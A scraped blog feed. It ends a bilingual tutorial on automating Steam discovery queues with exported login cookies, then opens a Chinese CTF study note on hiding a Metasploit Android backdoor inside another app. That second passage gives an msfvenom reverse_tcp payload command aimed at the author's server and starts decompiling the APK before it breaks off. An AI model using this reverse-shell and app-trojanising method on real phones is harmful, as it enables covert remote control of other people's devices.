&quot;76561199072167687%7C%7C19A14B89549F7DA47F0E071CC9D33FEF63D5EC27&quot;,</span><br><span class="line">        &quot;browserid&quot;: &quot;2683598387774835722&quot;,</span><br><span class="line">        &quot;steamID64&quot;: &quot;76561199072167687&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在Github-Action运行"><a href="#在Github-Action运行" class="headerlink" title="在Github Action运行"></a>在Github Action运行</h3><p>首先先打开仓库页面，Fork一份 -&gt; <a href="https://github.com/ElainaMoe/SteamAutoQueue">ElainaMoe&#x2F;SteamAutoQueue: 利用Github Action来Steam自动探索队列，不是油猴脚本，不需要打开浏览器或者Steam就可以运行，促销期间必备！</a></p><p>然后点击Settings -&gt;  Secrets -&gt; Actions，进入变量添加页面</p><p>添加如图所示的变量，<a href="#%E5%8F%98%E9%87%8F%E8%8E%B7%E5%8F%96">变量获取请查看这里</a></p><p>（图中的<code>steamRememberLogin</code>和<code>steamMachineAuth</code>已弃用）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-171847.png"></p><p>当然你也可以把Cookie用仓库里自带的<code>SetCookie.py</code>脚本放到你的Redis数据库里（填写<code>config.json</code>的<code>Steam</code>相关字段后，只需要把<code>Steam</code>键下的内容贴进脚本里设置就行了），这样你就不需要一个一个加，但是不是所有人都有数据库，所以说没有数据库的话就一个一个来吧。</p><p>添加完后点击顶上导航栏的Action按钮，然后点击中间的绿色按钮开启Action</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-172116.png"></p><p>然后按照如图所示的方式打开两个Action脚本</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-172237.png"></p><p>打开后可以运行一次看看结果，一般来说没有打叉就是没啥问题了</p><p>运行结果应该像下面这个这样（注：我这里Cookie的设置方式不太一样，我放在了Redis里面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">2022-07-02 09:15:54:INFO:</span><br><span class="line">     __ _                           _         _            ____                       </span><br><span class="line">    / _\ |_ ___  __ _ _ __ ___     /_\  _   _| |_ ___     /___ \_   _  ___ _   _  ___ </span><br><span class="line">    \ \| __/ _ \/ _` | &#x27;_ ` _ \   //_\\| | | | __/ _ \   //  / / | | |/ _ \ | | |/ _ \</span><br><span class="line">    _\ \ ||  __/ (_| | | | | | | /  _  \ |_| | || (_) | / \_/ /| |_| |  __/ |_| |  __/</span><br><span class="line">    \__/\__\___|\__,_|_| |_| |_| \_/ \_/\__,_|\__\___/  \___,_\ \__,_|\___|\__,_|\___|</span><br><span class="line">                                                            -- Made by GamerNoTitle</span><br><span class="line">2022-07-02 09:15:55:INFO:[SteamAutoQueue] Cookie get from Redis</span><br><span class="line">2022-07-02 09:15:55:INFO:[SteamAutoQueue] Initalizing instance...</span><br><span class="line">2022-07-02 09:15:56:INFO:[SteamAutoQueue] Instance initalized.</span><br><span class="line">2022-07-02 09:15:56:INFO:[SteamAutoQueue] Trying to access steam store.</span><br><span class="line">2022-07-02 09:15:57:INFO:[SteamAutoQueue] Successfully access steam store. Adding cookie...</span><br><span class="line">2022-07-02 09:15:57:INFO:[SteamAutoQueue] Successfully add cookie.</span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] You have been logged in as </span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] Try to start the queue.</span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] Start the queue failed, maybe you have already started a queue.</span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] We will try to spawn a new one.</span><br><span class="line">2022-07-02 09:16:06:INFO:[SteamAutoQueue] Starting Queue No.1</span><br><span class="line">2022-07-02 09:16:06:INFO:[SteamAutoQueue] Exploring 终暮黎明 with link https://store.steampowered.com/app/1823890/_/</span><br><span class="line">2022-07-02 09:16:08:INFO:[SteamAutoQueue] Exploring 未命名穿越记录 with link https://store.steampowered.com/app/1548680/_/</span><br><span class="line">2022-07-02 09:16:10:INFO:[SteamAutoQueue] Exploring Noctem with link https://store.steampowered.com/app/1701740/Noctem/</span><br><span class="line">2022-07-02 09:16:11:INFO:[SteamAutoQueue] Exploring Dagon: by H. P. Lovecraft with link https://store.steampowered.com/app/1481400/Dagon_by_H_P_Lovecraft/</span><br><span class="line">2022-07-02 09:16:13:INFO:[SteamAutoQueue] Exploring Trash Horror Collection with link https://store.steampowered.com/app/2017370/Trash_Horror_Collection/</span><br><span class="line">2022-07-02 09:16:16:INFO:[SteamAutoQueue] Exploring Critters for Sale with link https://store.steampowered.com/app/1078420/Critters_for_Sale/</span><br><span class="line">2022-07-02 09:16:17:INFO:[SteamAutoQueue] Exploring Will Die Alone with link https://store.steampowered.com/app/1879820/Will_Die_Alone/</span><br><span class="line">2022-07-02 09:16:19:INFO:[SteamAutoQueue] Exploring Faded Stories: Greenberg with link https://store.steampowered.com/app/1837820/Faded_Stories_Greenberg/</span><br><span class="line">2022-07-02 09:16:20:INFO:[SteamAutoQueue] Exploring Cyclone with link https://store.steampowered.com/app/1803590/Cyclone/</span><br><span class="line">2022-07-02 09:16:23:INFO:[SteamAutoQueue] Exploring QUICKERFLAK_RUTHLESSMOD with link https://store.steampowered.com/app/2010110/QUICKERFLAK_RUTHLESSMOD/</span><br><span class="line">2022-07-02 09:16:25:INFO:[SteamAutoQueue] Exploring 智能工厂大亨：序章 with link https://store.steampowered.com/app/1810980/_/</span><br><span class="line">2022-07-02 09:16:26:INFO:[SteamAutoQueue] Found age check when accessing https://store.steampowered.com/agecheck/app/919290/, skipping.</span><br><span class="line">2022-07-02 09:16:27:INFO:[SteamAutoQueue] Queue is empty, trying to spawn a new one.</span><br><span class="line">2022-07-02 09:16:32:INFO:[SteamAutoQueue] Spawned. Now we will continue the work.</span><br><span class="line">2022-07-02 09:16:32:INFO:[SteamAutoQueue] Starting Queue No.2</span><br><span class="line">2022-07-02 09:16:32:INFO:[SteamAutoQueue] Exploring 元宇宙-原始世界 with link https://store.steampowered.com/app/1757830/_/</span><br><span class="line">2022-07-02 09:16:34:INFO:[SteamAutoQueue] Exploring 残世界的鸢尾花 with link https://store.steampowered.com/app/1669330/_/</span><br><span class="line">2022-07-02 09:16:37:INFO:[SteamAutoQueue] Exploring 重力朋克 with link https://store.steampowered.com/app/1831520/_/</span><br><span class="line">2022-07-02 09:16:38:INFO:[SteamAutoQueue] Exploring 最后的夜晚 Babel with link https://store.steampowered.com/app/1436980/_Babel/</span><br><span class="line">2022-07-02 09:16:40:INFO:[SteamAutoQueue] Exploring 畢業生模擬器 with link https://store.steampowered.com/app/1806070/_/</span><br><span class="line">2022-07-02 09:16:41:INFO:[SteamAutoQueue] Found age check when accessing https://store.steampowered.com/agecheck/app/1762700/, skipping.</span><br><span class="line">2022-07-02 09:16:43:INFO:[SteamAutoQueue] Exploring Zcrew(Z字特遣队) with link https://store.steampowered.com/app/1386650/ZcrewZ/</span><br><span class="line">2022-07-02 09:16:45:INFO:[SteamAutoQueue] Exploring Firelight Fantasy: Vengeance with link https://store.steampowered.com/app/1668780/Firelight_Fantasy_Vengeance/</span><br><span class="line">2022-07-02 09:16:47:INFO:[SteamAutoQueue] Exploring Orakyubu with link https://store.steampowered.com/app/1654900/Orakyubu/</span><br><span class="line">2022-07-02 09:16:54:INFO:[SteamAutoQueue] Exploring Crazy Kung Fu with link https://store.steampowered.com/app/1340300/Crazy_Kung_Fu/</span><br><span class="line">2022-07-02 09:16:55:INFO:[SteamAutoQueue] Exploring Gunborg: Dark Matters with link https://store.steampowered.com/app/1529160/Gunborg_Dark_Matters/</span><br><span class="line">2022-07-02 09:16:57:INFO:[SteamAutoQueue] Exploring Cyrah&#x27;s Ascent with link https://store.steampowered.com/app/1992850/Cyrahs_Ascent/</span><br><span class="line">2022-07-02 09:16:58:INFO:[SteamAutoQueue] Queue is empty, trying to spawn a new one.</span><br><span class="line">2022-07-02 09:17:03:INFO:[SteamAutoQueue] Spawned. Now we will continue the work.</span><br><span class="line">2022-07-02 09:17:03:INFO:[SteamAutoQueue] Starting Queue No.3</span><br><span class="line">2022-07-02 09:17:03:INFO:[SteamAutoQueue] Exploring 恋与你 Love with You with link https://store.steampowered.com/app/1814380/_Love_with_You/</span><br><span class="line">2022-07-02 09:17:08:INFO:[SteamAutoQueue] Exploring 堪舆剑冢 with link https://store.steampowered.com/app/1640150/_/</span><br><span class="line">2022-07-02 09:17:10:INFO:[SteamAutoQueue] Exploring Villwars with link https://store.steampowered.com/app/2013990/Villwars/</span><br><span class="line">2022-07-02 09:17:11:INFO:[SteamAutoQueue] Exploring Siege of Treboulain with link https://store.steampowered.com/app/1849760/Siege_of_Treboulain/</span><br><span class="line">2022-07-02 09:17:13:INFO:[SteamAutoQueue] Exploring Contract Killer with link https://store.steampowered.com/app/1588250/Contract_Killer/</span><br><span class="line">2022-07-02 09:17:15:INFO:[SteamAutoQueue] Exploring Tales From Hoia Baciu Forest with link https://store.steampowered.com/app/2002560/Tales_From_Hoia_Baciu_Forest/</span><br><span class="line">2022-07-02 09:17:16:INFO:[SteamAutoQueue] Exploring Endlanders : First Encounter with link https://store.steampowered.com/app/2010450/Endlanders__First_Encounter/</span><br><span class="line">2022-07-02 09:17:18:INFO:[SteamAutoQueue] Exploring Flight Of Nova with link https://store.steampowered.com/app/1069190/Flight_Of_Nova/</span><br><span class="line">2022-07-02 09:17:19:INFO:[SteamAutoQueue] Exploring Gary Grigsby&#x27;s War in the East 2 with link https://store.steampowered.com/app/1775550/Gary_Grigsbys_War_in_the_East_2/</span><br><span class="line">2022-07-02 09:17:21:INFO:[SteamAutoQueue] Exploring DOOM TOMB with link https://store.steampowered.com/app/1893050/DOOM_TOMB/</span><br><span class="line">2022-07-02 09:17:22:INFO:[SteamAutoQueue] Exploring Nyaaaanvy with link https://store.steampowered.com/app/1771990/Nyaaaanvy/</span><br><span class="line">2022-07-02 09:17:24:INFO:[SteamAutoQueue] Exploring Batho[tel] with link https://store.steampowered.com/app/1981590/Bathotel/</span><br><span class="line">2022-07-02 09:17:25:INFO:[SteamAutoQueue] SteamAutoQueue&#x27;s work has done!</span><br></pre></td></tr></table></figure><h3 id="无法运行-x2F-发现Bug"><a href="#无法运行-x2F-发现Bug" class="headerlink" title="无法运行&#x2F;发现Bug"></a>无法运行&#x2F;发现Bug</h3><p>请带着你的运行日志到<a href="https://github.com/ElainaMoe/SteamAutoQueue/issues">Issues · ElainaMoe&#x2F;SteamAutoQueue (github.com)</a>报个BUG吧</p><h2 id="English"><a href="#English" class="headerlink" title="English"></a>English</h2><ul><li><a href="#Getting%20variables">Getting variables</a></li><li><a href="#Run%20on%20Github%20Action">Run on Github Action</a></li></ul><p><strong>Actually I started to do this before Summer-Sale. However that week is filled with examinations. So I just guarantee the Windows local version can be run successfully and left Linux behind. When it comes to the weekend, it was the time that Summer-Sale has began……</strong></p><p>Why I made this? For the reason that as a student, I will not open my computer everyday. The script that run on TemperMoney or the one in Steam++ need a browser or Steam client to run. So I make this one that no anything need to open.</p><p>But I finish this too late, so when it comes to the Winter-Sale that I will promote it by myself. If  you’re willing to promote my script, just do it. No any permission needed. After you promote it, just left you link in the comment below. Thank you!</p><blockquote><p>Give me a STAR ✨ and we will start now.</p></blockquote><h3 id="Getting-variables"><a href="#Getting-variables" class="headerlink" title="Getting variables"></a>Getting variables</h3><p>First, you need to open your browser and login your Steam account (<code>Remember me on this computer</code> should be checked), then press <kbd>F12</kbd> to open the developer tool.</p><p>Find the <code>Application</code> button on the nav-bar and find <code>cookie</code> -&gt; <code>https://store.steampowered.com</code> on the tree-nav on the left.</p><p>You will see the sheets like this</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-170037.png"></p><p>What we need is to find the content for the config below (&lt;<code>name</code>: <code>Variable-Type</code>&gt;)</p><p><code>proxy</code> is the address that you need to use for proxy, use it as you need. (Some one will use v2ray or something else so I made this. If you’re running on Github Action, then this is not needed.)</p><p><strong>CAUTION: <code>steamRememberLogin</code> is valid for one month, and I didn’t know whether the script can be run if this is missing (<del>Actually the thing is that I’m too lazy to test it.</del> <code>steamRememberLogin</code> is desperated, idk how long you can use it after once you attain them)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;proxy&quot;: &quot;&quot;,</span><br><span class="line">    &quot;steam&quot;: &#123;</span><br><span class="line">        &quot;sessionid&quot;: &lt;sessionid: str&gt;,</span><br><span class="line">        &quot;steamLoginSecure&quot;: &lt;steamLoginSecure: str&gt;,</span><br><span class="line">        &quot;browserid&quot;: &lt;browserid: str&gt;,</span><br><span class="line">        &quot;steamID64&quot;: &lt;Steam 64ID, you can find it behind steamMachineAuth: str&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This is an example (This account has been logged out so this is not valid for using)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;proxy&quot;: &quot;&quot;,</span><br><span class="line">    &quot;steam&quot;: &#123;</span><br><span class="line">        &quot;sessionid&quot;: &quot;9775e63b29f841ea44c4d5f2&quot;,</span><br><span class="line">        &quot;steamLoginSecure&quot;: &quot;76561199072167687%7C%7C19A14B89549F7DA47F0E071CC9D33FEF63D5EC27&quot;,</span><br><span class="line">        &quot;browserid&quot;: &quot;2683598387774835722&quot;,</span><br><span class="line">        &quot;steamID64&quot;: &quot;76561199072167687&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Run-on-Github-Action"><a href="#Run-on-Github-Action" class="headerlink" title="Run on Github Action"></a>Run on Github Action</h3><p>First open the repo and fork it -&gt; <a href="https://github.com/ElainaMoe/SteamAutoQueue">ElainaMoe&#x2F;SteamAutoQueue: Using Github Action to explore Steam queue every day. You will need it when it comes to the Summer&#x2F;Winter Sale.</a></p><p>Then click on Settings -&gt;  Secrets -&gt; Actions to enter the page to add variables</p><p>Add the variables shown on this picture, [you can know how to get then from here](#Getting variables)</p><p>（The vars <code>steamMachineAuth</code> and <code>steamRememberLogin</code> are now desperated)</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-171847.png"></p><p>The other way is that you can run the internal script <code>SetCookie.py</code> to place your config in your Redis. (Just fill in the <code>Steam</code> key in <code>config.json</code> and paste the <code>key</code> and <code>value</code> of <code>Steam</code> key in the <code>config.json</code> .) But not everyone has a Redis database. So if you don’t have one, then you should add it one-by-one.</p><p>After you finishing it, click the Action button from nav-bar and click the green button on the center to turn Action on.</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-172116.png"></p><p>Then enable the two scripts like this in the picture.</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-172237.png"></p><p>After you opened them, you can run them by yourself. If it doesn’t display something wrong, then you have finished.</p><p>The result should like this (I placed the variables in my Redis)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">2022-07-02 09:15:54:INFO:</span><br><span class="line">     __ _                           _         _            ____                       </span><br><span class="line">    / _\ |_ ___  __ _ _ __ ___     /_\  _   _| |_ ___     /___ \_   _  ___ _   _  ___ </span><br><span class="line">    \ \| __/ _ \/ _` | &#x27;_ ` _ \   //_\\| | | | __/ _ \   //  / / | | |/ _ \ | | |/ _ \</span><br><span class="line">    _\ \ ||  __/ (_| | | | | | | /  _  \ |_| | || (_) | / \_/ /| |_| |  __/ |_| |  __/</span><br><span class="line">    \__/\__\___|\__,_|_| |_| |_| \_/ \_/\__,_|\__\___/  \___,_\ \__,_|\___|\__,_|\___|</span><br><span class="line">                                                            -- Made by GamerNoTitle</span><br><span class="line">2022-07-02 09:15:55:INFO:[SteamAutoQueue] Cookie get from Redis</span><br><span class="line">2022-07-02 09:15:55:INFO:[SteamAutoQueue] Initalizing instance...</span><br><span class="line">2022-07-02 09:15:56:INFO:[SteamAutoQueue] Instance initalized.</span><br><span class="line">2022-07-02 09:15:56:INFO:[SteamAutoQueue] Trying to access steam store.</span><br><span class="line">2022-07-02 09:15:57:INFO:[SteamAutoQueue] Successfully access steam store. Adding cookie...</span><br><span class="line">2022-07-02 09:15:57:INFO:[SteamAutoQueue] Successfully add cookie.</span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] You have been logged in as </span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] Try to start the queue.</span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] Start the queue failed, maybe you have already started a queue.</span><br><span class="line">2022-07-02 09:15:59:INFO:[SteamAutoQueue] We will try to spawn a new one.</span><br><span class="line">2022-07-02 09:16:06:INFO:[SteamAutoQueue] Starting Queue No.1</span><br><span class="line">2022-07-02 09:16:06:INFO:[SteamAutoQueue] Exploring 终暮黎明 with link https://store.steampowered.com/app/1823890/_/</span><br><span class="line">2022-07-02 09:16:08:INFO:[SteamAutoQueue] Exploring 未命名穿越记录 with link https://store.steampowered.com/app/1548680/_/</span><br><span class="line">2022-07-02 09:16:10:INFO:[SteamAutoQueue] Exploring Noctem with link https://store.steampowered.com/app/1701740/Noctem/</span><br><span class="line">2022-07-02 09:16:11:INFO:[SteamAutoQueue] Exploring Dagon: by H. P. Lovecraft with link https://store.steampowered.com/app/1481400/Dagon_by_H_P_Lovecraft/</span><br><span class="line">2022-07-02 09:16:13:INFO:[SteamAutoQueue] Exploring Trash Horror Collection with link https://store.steampowered.com/app/2017370/Trash_Horror_Collection/</span><br><span class="line">2022-07-02 09:16:16:INFO:[SteamAutoQueue] Exploring Critters for Sale with link https://store.steampowered.com/app/1078420/Critters_for_Sale/</span><br><span class="line">2022-07-02 09:16:17:INFO:[SteamAutoQueue] Exploring Will Die Alone with link https://store.steampowered.com/app/1879820/Will_Die_Alone/</span><br><span class="line">2022-07-02 09:16:19:INFO:[SteamAutoQueue] Exploring Faded Stories: Greenberg with link https://store.steampowered.com/app/1837820/Faded_Stories_Greenberg/</span><br><span class="line">2022-07-02 09:16:20:INFO:[SteamAutoQueue] Exploring Cyclone with link https://store.steampowered.com/app/1803590/Cyclone/</span><br><span class="line">2022-07-02 09:16:23:INFO:[SteamAutoQueue] Exploring QUICKERFLAK_RUTHLESSMOD with link https://store.steampowered.com/app/2010110/QUICKERFLAK_RUTHLESSMOD/</span><br><span class="line">2022-07-02 09:16:25:INFO:[SteamAutoQueue] Exploring 智能工厂大亨：序章 with link https://store.steampowered.com/app/1810980/_/</span><br><span class="line">2022-07-02 09:16:26:INFO:[SteamAutoQueue] Found age check when accessing https://store.steampowered.com/agecheck/app/919290/, skipping.</span><br><span class="line">2022-07-02 09:16:27:INFO:[SteamAutoQueue] Queue is empty, trying to spawn a new one.</span><br><span class="line">2022-07-02 09:16:32:INFO:[SteamAutoQueue] Spawned. Now we will continue the work.</span><br><span class="line">2022-07-02 09:16:32:INFO:[SteamAutoQueue] Starting Queue No.2</span><br><span class="line">2022-07-02 09:16:32:INFO:[SteamAutoQueue] Exploring 元宇宙-原始世界 with link https://store.steampowered.com/app/1757830/_/</span><br><span class="line">2022-07-02 09:16:34:INFO:[SteamAutoQueue] Exploring 残世界的鸢尾花 with link https://store.steampowered.com/app/1669330/_/</span><br><span class="line">2022-07-02 09:16:37:INFO:[SteamAutoQueue] Exploring 重力朋克 with link https://store.steampowered.com/app/1831520/_/</span><br><span class="line">2022-07-02 09:16:38:INFO:[SteamAutoQueue] Exploring 最后的夜晚 Babel with link https://store.steampowered.com/app/1436980/_Babel/</span><br><span class="line">2022-07-02 09:16:40:INFO:[SteamAutoQueue] Exploring 畢業生模擬器 with link https://store.steampowered.com/app/1806070/_/</span><br><span class="line">2022-07-02 09:16:41:INFO:[SteamAutoQueue] Found age check when accessing https://store.steampowered.com/agecheck/app/1762700/, skipping.</span><br><span class="line">2022-07-02 09:16:43:INFO:[SteamAutoQueue] Exploring Zcrew(Z字特遣队) with link https://store.steampowered.com/app/1386650/ZcrewZ/</span><br><span class="line">2022-07-02 09:16:45:INFO:[SteamAutoQueue] Exploring Firelight Fantasy: Vengeance with link https://store.steampowered.com/app/1668780/Firelight_Fantasy_Vengeance/</span><br><span class="line">2022-07-02 09:16:47:INFO:[SteamAutoQueue] Exploring Orakyubu with link https://store.steampowered.com/app/1654900/Orakyubu/</span><br><span class="line">2022-07-02 09:16:54:INFO:[SteamAutoQueue] Exploring Crazy Kung Fu with link https://store.steampowered.com/app/1340300/Crazy_Kung_Fu/</span><br><span class="line">2022-07-02 09:16:55:INFO:[SteamAutoQueue] Exploring Gunborg: Dark Matters with link https://store.steampowered.com/app/1529160/Gunborg_Dark_Matters/</span><br><span class="line">2022-07-02 09:16:57:INFO:[SteamAutoQueue] Exploring Cyrah&#x27;s Ascent with link https://store.steampowered.com/app/1992850/Cyrahs_Ascent/</span><br><span class="line">2022-07-02 09:16:58:INFO:[SteamAutoQueue] Queue is empty, trying to spawn a new one.</span><br><span class="line">2022-07-02 09:17:03:INFO:[SteamAutoQueue] Spawned. Now we will continue the work.</span><br><span class="line">2022-07-02 09:17:03:INFO:[SteamAutoQueue] Starting Queue No.3</span><br><span class="line">2022-07-02 09:17:03:INFO:[SteamAutoQueue] Exploring 恋与你 Love with You with link https://store.steampowered.com/app/1814380/_Love_with_You/</span><br><span class="line">2022-07-02 09:17:08:INFO:[SteamAutoQueue] Exploring 堪舆剑冢 with link https://store.steampowered.com/app/1640150/_/</span><br><span class="line">2022-07-02 09:17:10:INFO:[SteamAutoQueue] Exploring Villwars with link https://store.steampowered.com/app/2013990/Villwars/</span><br><span class="line">2022-07-02 09:17:11:INFO:[SteamAutoQueue] Exploring Siege of Treboulain with link https://store.steampowered.com/app/1849760/Siege_of_Treboulain/</span><br><span class="line">2022-07-02 09:17:13:INFO:[SteamAutoQueue] Exploring Contract Killer with link https://store.steampowered.com/app/1588250/Contract_Killer/</span><br><span class="line">2022-07-02 09:17:15:INFO:[SteamAutoQueue] Exploring Tales From Hoia Baciu Forest with link https://store.steampowered.com/app/2002560/Tales_From_Hoia_Baciu_Forest/</span><br><span class="line">2022-07-02 09:17:16:INFO:[SteamAutoQueue] Exploring Endlanders : First Encounter with link https://store.steampowered.com/app/2010450/Endlanders__First_Encounter/</span><br><span class="line">2022-07-02 09:17:18:INFO:[SteamAutoQueue] Exploring Flight Of Nova with link https://store.steampowered.com/app/1069190/Flight_Of_Nova/</span><br><span class="line">2022-07-02 09:17:19:INFO:[SteamAutoQueue] Exploring Gary Grigsby&#x27;s War in the East 2 with link https://store.steampowered.com/app/1775550/Gary_Grigsbys_War_in_the_East_2/</span><br><span class="line">2022-07-02 09:17:21:INFO:[SteamAutoQueue] Exploring DOOM TOMB with link https://store.steampowered.com/app/1893050/DOOM_TOMB/</span><br><span class="line">2022-07-02 09:17:22:INFO:[SteamAutoQueue] Exploring Nyaaaanvy with link https://store.steampowered.com/app/1771990/Nyaaaanvy/</span><br><span class="line">2022-07-02 09:17:24:INFO:[SteamAutoQueue] Exploring Batho[tel] with link https://store.steampowered.com/app/1981590/Bathotel/</span><br><span class="line">2022-07-02 09:17:25:INFO:[SteamAutoQueue] SteamAutoQueue&#x27;s work has done!</span><br></pre></td></tr></table></figure><h3 id="Unable-to-run-x2F-Find-a-bug"><a href="#Unable-to-run-x2F-Find-a-bug" class="headerlink" title="Unable to run &#x2F; Find a bug"></a>Unable to run &#x2F; Find a bug</h3><p>Please go to <a href="https://github.com/ElainaMoe/SteamAutoQueue/issues">Issues · ElainaMoe&#x2F;SteamAutoQueue (github.com)</a> and submit a issue. Thanks!</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习笔记（大学篇）07 —— 手动注入msf到指定的程序</title>
      <link href="/posts/CTF-in-College-7/"/>
      <url>/posts/CTF-in-College-7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>填坑回，因为之前在<a href="https://bili33.top/posts/CTF-in-College-5/">CTF学习笔记（大学篇）05 —— 通过msfconsole和520apkhook创建带有后门程序的安卓程序 | GamerNoTitle (bili33.top)</a>这篇文章里面说有时间就写，然后写我们CTF俱乐部学期总结的时候就顺带讲了这个，所以就填了个坑</p></blockquote><p>首先要生成带有后门程序的apk文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=5555 R &gt; pentestlab.apk</span><br></pre></td></tr></table></figure><p>这里的host我实际上填的是我的公网服务器的IP地址，生成以后，如果直接安装，手机是肯定会报毒的（特别是装的国产定制ROM如MIUI、COLOROS之类的），这个时候就要把我们的后门程序注入到其他的软件里面去</p><p>（装上了会像右边这个图标这样，啥也没有，而且点开除了打开了后门也不会有什么反应）<img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-7/image-20220624233959348.png?download=true"></p><p>然后我们反编译一下软件，用Linux（可能会）自带的apktool（如果没有请直走右转Github）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(gamernotitle㉿kali-vmware)-[~/apk]</span><br><span class="line">└─$ java -jar apktool_2.6.1.jar d -f -o payload pentestlab.apk  </span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br><span class="line">I: Using Apktool 2.6.1 on pentestlab.apk</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Loading resource table from file: /home/gamernotitle/.local/share/apktool/framework/1.apk</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Decoding 